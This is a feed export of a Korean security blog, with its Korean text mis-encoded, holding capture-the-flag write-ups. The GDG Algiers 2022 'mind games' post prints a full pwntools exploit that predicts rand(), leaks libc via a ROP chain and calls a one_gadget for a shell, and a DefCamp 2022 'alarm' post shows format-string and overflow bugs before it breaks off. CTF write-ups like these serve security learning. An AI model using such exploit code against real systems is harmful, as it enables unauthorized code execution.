ÎÖ∏Î†• Ï§ëÏù¥Îã§. ÏòàÏ†ÑÏóê Ïó¨Îü¨Î≤à ÏãúÎèÑÌñàÏóàÎäîÎç∞ ÏÇ¨Ïö©Î≤ïÏù¥ Ï†ÅÏùëÏù¥ ÏïàÎêòÏñ¥ÏÑú Ïã§Ìå®ÌïòÍ≥† Í∞ÄÏÉÅÎ®∏Ïã†ÏùÑ ÏÑ§ÏπòÌñàÏóàÎã§..„Öã„Öã Í∑∏Îü∞Îç∞ Ïù¥Î≤àÏóî Ï°∞Í∏à ÎßéÏù¥ ÏπúÌï¥Ï°åÎã§. ÎøåÎìØÌïòÎã§.</p></li><li><p>Ï†ÑÏóê Îã§ÎãàÎçò ÎåÄÌïôÏóêÏÑú Î≥¥Ïïà Í¥ÄÎ†®ÏóêÏÑú Î∞úÌëúÎ•º Ìï¥Ï£ºÎ©¥ Ï¢ãÍ≤†Îã§Í≥† Ïó∞ÎùΩÏù¥ ÏôîÏóàÎã§. Î¨¥Î†§ Ï¥ùÏû•ÎãòÏùò Î∂ÄÎ¶ÑÏù¥ÏóàÎäîÎç∞ Í∞úÏù∏ÏÇ¨Ïú†Î°ú Ïù∏Ìï¥ Í±∞Ï†àÌñàÎã§. Ïûò Ïò§ÏßÄ ÏïäÎäî Í∏∞ÌöåÏòÄÎäîÎç∞ ÏïÑÏâΩÎã§.</p></li><li><p>Ïö¥ÏòÅÏ≤¥Ï†úÎ•º Î∞îÍø®Îã§. windows 11ÏóêÏÑú arch linuxÎ°ú.. „Öã„Öã<br>windowsÍ∞Ä Í∞ÄÏû• Î∂àÌé∏ÌñàÎçò Í≤ÉÏùÄ Í∞ÄÏÉÅÎ®∏Ïã†ÏùÑ Íµ¨ÎèôÌïòÎã§Î≥¥Î©¥ Í∞ÄÏÉÅÎ®∏Ïã† ÏûêÏ≤¥Í∞Ä Îß§Ïö∞Îß§Ïö∞Îß§Ïö∞ ÎäêÎ†§ÏßÑÎã§. Í∑∏Î¶¨Í≥† Î≠îÍ∞Ä Ï∞Ω Í¥ÄÎ¶¨Í∞Ä ÏïàÎêêÎã§. ÏÇ¨Ïã§ wslÎèÑ Ï∂îÏ≤úÎ∞õÍ≥† Ïç®Î¥§ÏóàÎäîÎç∞ Î≠îÍ∞Ä ÎÇ¥ Ïä§ÌÉÄÏùºÏùÄ ÏïÑÎãàÏóàÎã§(?) Í∑∏Îü¨Îçò Ï§ëÏóê arch linuxÎ°ú Ïö¥ÏòÅÏ≤¥Ï†úÎ•º Î∞îÍæ∏Îäî Í±¥ Ïñ¥ÎñªÎÉêÍ≥† Í∂åÏú†Î∞õÏïòÍ≥† Î∞îÎ°ú Ïã§ÌñâÌïòÏòÄÎã§. „Öé<br>windowsÏóêÏÑú Í∞ÄÏÉÅÎ®∏Ïã†ÏúºÎ°ú ubuntuÎ•º Ïì∞Îäî Í≤ÉÍ≥º Í∞ÄÏû• ÌÅ∞ Ï∞®Ïù¥Îäî archÎäî Ï†ïÎßê ÍπîÎ†§ÏûàÎäî Í≤å ÏóÜÎã§Îäî Í≤ÉÏù¥Îã§. ÏÇ¨Ïö©ÏûêÍ∞Ä Ï†ÑÎ∂Ä Îã§ ÏÑ§Ï†ïÌï¥Ï§òÏïº ÌïúÎã§. ÏûêÏú†ÎèÑÍ∞Ä ÎÜíÍ≥† Í∞ÄÎ≥çÎã§Îäî Í≤ÉÏù¥ Ïñ¥Îñ§Í±¥ÏßÄ Î∞îÎ°ú Ïã§Í∞êÌï† Ïàò ÏûàÏóàÎã§. Í∑∏Î¶¨Í≥† ubuntuÎ•º ÏÑ§ÏπòÌï† Îïê next Î≤ÑÌäº ÌïòÎÇòÎ°ú Î™®Îì† Í≤ÉÏù¥ ÏßÑÌñâÎêòÏóàÎäîÎç∞, Ïù¥Í±¥ ÎÇ¥Í∞Ä ÏßÅÏ†ë Î™ÖÎ†πÏñ¥Î•º Ï≥êÏ§òÏïº ÌïúÎã§. Ï¢Ä Ïã†Í∏∞ÌñàÎã§.<br>i3 Ï≤òÏùå Ïì∏ Îïå Ï†ïÎßê ÏïàÏùµÏàôÌñàÏóàÎäîÎç∞ ÏßÄÍ∏àÏùÄ ÎßéÏù¥ ÏùµÏàôÌï¥Ï°åÎã§. Ïò§ÌûàÎ†§ i3ÏùÑ Ïì∞ÏßÄ ÏïäÏúºÎ©¥ Î∂àÌé∏ÌïòÎã§. archÎèÑ Í∑∏Î†áÍ≤å Îê† Í≤ÉÏù¥Îùº ÎØøÎäîÎã§.</p></li><li><p>Î∂ÑÏÑùÌïòÍ≥† Ïã∂ÏùÄ Í≤ÉÏù¥ ÏûàÏóàÏñ¥ÏÑú Î∂ÑÏÑùÏùÑ Ïû†Íπê ÌñàÏóàÎäîÎç∞ Ïó≠ÏãúÎÇò Î∂ÑÏÑùÏùÄ Ïñ¥Î†µÎã§. Í¥ÄÎ†® ÎÇ¥Ïö©ÏùÑ ÎÇòÏ§ëÏóê Î∏îÎ°úÍ∑∏Ïóê Ï†ÅÍ≥† Ïã∂Îã§.</p></li><li><p>ÎÇòÏ§ëÏóê ÏòÅÏñ¥Î°úÎèÑ Í∏ÄÏùÑ Ïç®Î≥¥Í≥† Ïã∂Îã§. Ïñ∏Ï††Í∞Ñ Íº≠..</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDG Algiers CTF 2022 - mind games (random)</title>
      <link href="/221011-gdg_algires_ctf_2022-mind_games/"/>
      <url>/221011-gdg_algires_ctf_2022-mind_games/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Arch linux<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: binary, source code, libc </p><p>Help! This program is playing mind games with me! You need to put an end to this madness.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><p>Ï†úÍ≥µÎêú source codeÍ∞Ä ÏßßÏïÑÏÑú Ï†ÑÎ¨∏ÏùÑ Ïò¨Î†∏Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == file) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cannot open flag.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            c = fgetc(file);</span><br><span class="line">            <span class="keyword">if</span> (c == EOF)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> input[BUF_SIZE] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> randnum, guess;</span><br><span class="line"></span><br><span class="line">    disable_buffering();</span><br><span class="line"></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You think you can read my mind? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input); <span class="comment">// bof</span></span><br><span class="line">    guess = atoi(input);</span><br><span class="line">    randnum = rand();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (guess == randnum) &#123;</span><br><span class="line">        flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s what I thought.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>random Í∞íÏùÑ ÎßûÏ∂îÎ©¥ <code>flag()</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïúÎã§. <code>scanf(&quot;%s&quot;, input)</code>ÏóêÏÑú bofÍ∞Ä ÌÑ∞ÏßÄÎãàÍπê inputÏùÑ ÏûÖÎ†•Ìï† Îïå guessÎûë randnumÏùÑ ÎèôÏùºÌïòÍ≤å Ï£ºÎ©¥ Ïö∞ÌöåÍ∞Ä ÎêòÏßÄ ÏïäÏùÑÍπå? ÏÉùÍ∞ÅÌñàÎã§. ÌïòÏßÄÎßå ÏûÖÎ†• ÌõÑÏóê guessÏôÄ randnumÏùÑ Ï†ïÏùòÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Í∑∏Îü∞ Î∞©Î≤ïÏùÄ ÌÜµÌïòÏßÄ ÏïäÎäîÎã§.</p><p>Ïñ¥ÎñªÍ≤å Ìï¥ÏïºÌï†Íπå?</p><p>randnumÏùÑ Ï†ïÏùòÌïòÎäî Ìï®ÏàòÎäî <code>rand()</code> Ìï®ÏàòÏù¥Îã§. Í∞ÑÎã®ÌïòÍ≤å ÎßêÌïòÎ©¥ Ïù¥ Ìï®ÏàòÎäî <code>srand()</code> Ìï®ÏàòÏóê ÏùòÏ°¥Ï†ÅÏù∏Îç∞ Ïù∏ÏûêÎ°ú <code>time(NULL)</code>Ïù¥ Îì§Ïñ¥Í∞ÑÎã§. Í∞ôÏùÄ ÏãúÍ∞ÑÎåÄÏóê Îã§Î•∏ ÌîÑÎ°úÍ∑∏Îû®ÏùÑ Ïã§ÌñâÌï¥ÎèÑ ÌîÑÎ°úÍ∑∏Îû®Ïùò ÌòÑÏû¨ ÏãúÍ∞ÑÏùÑ Í∞ÄÏ†∏Ïò§Í∏∞ ÎïåÎ¨∏Ïóê Ïö∞Î¶¨Îäî randnumÏùÑ ÏòàÏ∏°Ìï† Ïàò ÏûàÎã§.</p><p>Í¥ÄÎ†® ÎÇ¥Ïö©ÏùÄ ÎÇòÏùò <a href="https://jiravvit.tistory.com/entry/NOTE-coding-%EB%82%9C%EC%88%98%EC%83%9D%EC%84%B1randsrandtime-C%EC%96%B8%EC%96%B4">Íµ¨ Ìã∞Ïä§ÌÜ†Î¶¨ Î∏îÎ°úÍ∑∏</a>Ïóê ÏûêÏÑ∏Ìûà ÏÑ§Î™ÖÎêòÏñ¥ ÏûàÎã§.</p><p>Ïù¥Îü∞ÏãùÏúºÎ°ú <code>flag()</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌï† Ïàò ÏûàÎäîÎç∞ ÎØ∏Î¶¨ Ïä§Ìè¨ÌïòÏûêÎ©¥ Ïù¥ Ìï®ÏàòÎäî ÏßÑÏßú flagÎ•º Ìò∏Ï∂úÌïòÏßÄ ÏïäÎäîÎã§.</p><p>Í∑∏ÎûòÏÑú bofÎ•º Ïù¥Ïö©ÌïòÏó¨ ripÎ•º Î∞îÍøî <code>execve</code>Î•º Ìò∏Ï∂£Ìï¥Ïïº ÌïúÎã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ÏãúÎÇòÎ¶¨Ïò§"><a href="#ÏãúÎÇòÎ¶¨Ïò§" class="headerlink" title="ÏãúÎÇòÎ¶¨Ïò§"></a>ÏãúÎÇòÎ¶¨Ïò§</h3><ol><li>random Í∞í Íµ¨Ìïú ÌõÑ, libc leak ÌõÑ mainÏúºÎ°ú ÌùêÎ¶Ñ ÎèåÎ¶¨Í∏∞</li><li>random Í∞í Îã§Ïãú Íµ¨Ìïú ÌõÑ, one gadget Ìò∏Ï∂ú</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./mind-games&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.ctf.gdgalgiers.com&#x27;</span>, <span class="number">1404</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mind-games&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line">log.info(<span class="string">b&#x27;random ::&#x27;</span> + random)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004014c3</span></span><br><span class="line">puts_plt = e.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line"></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> </span><br><span class="line">payload += p64(<span class="number">0xe6c84</span>+libc_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><ol><li><p>ÌíÄÍ≥† ÎÇòÏÑú ÏùµÏä§ ÏΩîÎìúÎ•º ÎÇ†Î†§Î≤ÑÎ†§ÏÑú ÎåÄÌöå ÎÅùÎÇòÍ≥† Îã§Ïãú ÌíÄÏóàÎã§. ÎåÄÌöå Îïå Î≠îÍ∞Ä ÌôïÎ•†Ï†ÅÏúºÎ°ú shellÏùÑ ÏñªÏùÑ Ïàò ÏûàÏóàÎäîÎç∞, ÏßÄÍ∏à ÏÉùÍ∞ÅÌï¥Î≥¥Îãà random Í∞í ÎïåÎ¨∏Ïù¥ÏóàÎçò Í≤É Í∞ôÎã§. Ï≤´ mainÏóêÏÑú Íµ¨Ìïú random Í∞íÏùÑ Îëê Î≤àÏß∏ mainÏóêÏÑú ÏÇ¨Ïö©ÌïòÎ†§Îãà ÏãúÍ∞ÑÏù¥ Ï°∞Í∏à ÏßÄÎÇò ÌùêÎ¶ÑÏù¥ Ïù¥Ïñ¥ÏßÄÏßÄ ÏïäÎäî Í≤ΩÏö∞Í∞Ä ÏÉùÍ≤®ÏÑú while, try-except Íµ¨Î¨∏ÏùÑ Ïù¥Ïö©ÌñàÏóàÎã§‚Ä¶ „Öã„Öã </p></li><li><p>ÎåÄÌöå Ï¢ÖÎ£å ÌõÑ Ïù¥Í≤å ÏÜîÎ∏å ÏàòÍ∞Ä 19ÏòÄÎäîÎç∞ 25ÏÜîÏßúÎ¶¨ Î¨∏Ï†úÎäî ÌíÄÏßÄ Î™ªÌïòÏòÄÎã§ „Öú„Öú, Ìûô Î¨∏Ï†úÏòÄÎäîÎç∞.. ÏöîÏïΩÌïòÏûêÎ©¥ oobÎ•º ÌÜµÌï¥ libc leakÏùÑ Ìï† Ïàò ÏûàÍ≥†, heap overflowÎ•º Ïù¥Ïö©ÌïòÏó¨ heap chunkÏùò sizeÎ•º Ï°∞ÏûëÌï† Ïàò ÏûàÎã§. Ïù¥Í±∞Î•º Ïù¥Ïö©Ìï¥ÏÑú Ìë∏Îäî Î¨∏Ï†úÏòÄÎäîÎç∞,.. ÏïîÌäº Î™ªÌíÄÏóàÎã§. Îã§Î•∏ Ïâ¨Ïö¥ Ìûô Î¨∏Ï†úÎì§ Ï¢Ä ÌíÄÏñ¥Î≥¥Í≥† ÌíÄÏñ¥Î¥êÏïºÍ≤†Îã§ T_T</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> GDG-Algiers </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> random </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - alarm (fsb, one_gadget)</title>
      <link href="/221005-d-ctf2022-alarm/"/>
      <url>/221005-d-ctf2022-alarm/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨</p><p>Ìï¥Îãπ ctfÏóê pwnÏù¥ Îëê Î¨∏Ï†ú ÎÇòÏôîÎã§. Ïù¥Í±¥ mediumÏù¥Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><p>IDAÎ°ú Ïó¥Ïñ¥Î≥¥Î©¥ ÎêòÍ≤å Í∞ÑÎã®ÌïòÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400807(a1, a2, a3);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;buf, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the Alarm system!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(byte_6010C0, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_6010C0);                        <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unlock value of alarm: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      vuln(<span class="string">&quot;%x&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;UGVybWlzc2lvbiBkZW5pZWQhCg==\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb Ï∑®ÏïΩÏ†êÏù¥ ÎåÄÎÜìÍ≥† Î≥¥Ïù∏Îã§. ÏûÖÎ†•Ìï† Ïàò ÏûàÎäî Î∞îÏù¥Ìä∏ ÏàòÎèÑ ÍµâÏû•Ìûà ÎÑâÎÑâÌïòÎã§.</p><p>Î∞îÎ°ú ÏïÑÎûòÏóêÏÑúÎèÑ Ïñ¥Îñ§ ÏûÖÎ†•Í∞í ÌïòÎÇòÎ•º Ï£ºÍ≥† Í∑∏ ÏûÖÎ†•Í∞íÏù¥ <code>/dev/urandom</code> ÎûúÎç§Í∞íÍ≥º Í∞ôÏùÄÏßÄ ÎπÑÍµêÌïúÎã§. Í∞ôÏúºÎ©¥ <code>vuln</code> Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÏñ¥ bofÎ•º Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400861</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Alarm set to @%p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">5000uLL</span>);                        <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb Ï∑®ÏïΩÏ†êÏù¥ Ï°¥Ïû¨ÌïúÎã§Î©¥ 